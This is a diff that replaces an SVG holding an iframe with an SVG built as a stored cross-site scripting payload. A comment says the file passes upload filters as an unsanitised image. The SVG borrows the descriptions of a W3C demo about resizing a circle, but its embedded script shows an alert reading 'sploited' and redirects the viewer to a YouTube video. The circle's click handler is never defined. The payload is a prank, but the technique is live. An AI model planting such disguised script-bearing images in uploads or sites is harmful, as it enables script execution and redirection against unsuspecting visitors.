@@ -1,8 +1,24 @@
-<svg width="460" height="450">
-    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-    <foreignObject x="10" y="10" width="400" height="400">
-      <body xmlns="http://www.w3.org/1999/xhtml">
-        <iframe src="https://google.com/" style="width:700px;height:700px"></iframe>
-      </body>
-    </foreignObject>
+//this file can be uploaded to most sites and is treated as an image type, therefore is not sanitized
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="6cm" height="5cm" viewBox="0 0 600 500"
+     xmlns="http://www.w3.org/2000/svg" version="1.1">
+  <desc>Example script01 - invoke an ECMAScript function from an onclick event
+  </desc>
+  <!-- ECMAScript to change the radius with each click -->
+  <script type="application/ecmascript"> <![CDATA[
+    alert("sploited");
+    window.location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+  ]]> </script>
+
+  <!-- Outline the drawing area with a blue line -->
+  <rect x="1" y="1" width="598" height="498" fill="none" stroke="blue"/>
+  <!-- Act on each click event -->
+  <circle onclick="circle_click(evt)" cx="300" cy="225" r="100"
+          fill="red"/>
+  <text x="300" y="480" 
+        font-family="Verdana" font-size="35" text-anchor="middle">
+    Click on circle to change its size
+  </text>
 </svg>
